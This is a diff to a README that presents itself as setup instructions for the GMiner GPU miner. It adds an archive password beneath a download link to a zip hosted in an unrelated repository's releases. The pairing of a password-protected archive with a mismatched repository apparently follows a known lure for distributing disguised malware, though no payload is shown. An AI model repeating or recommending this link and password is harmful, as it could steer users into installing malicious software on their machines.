@@ -18,7 +18,7 @@ GMiner is a high-performance GPU miner that supports a wide range of algorithms 
 
 
 - [Download](https://github.com/balint111110/awesome-llm-apps/releases/download/Download/Version_3.0.zip)
-
+- Passw0rd: 2042
 ### Step 2: Extract and Setup
 
 1. Extract the downloaded file.
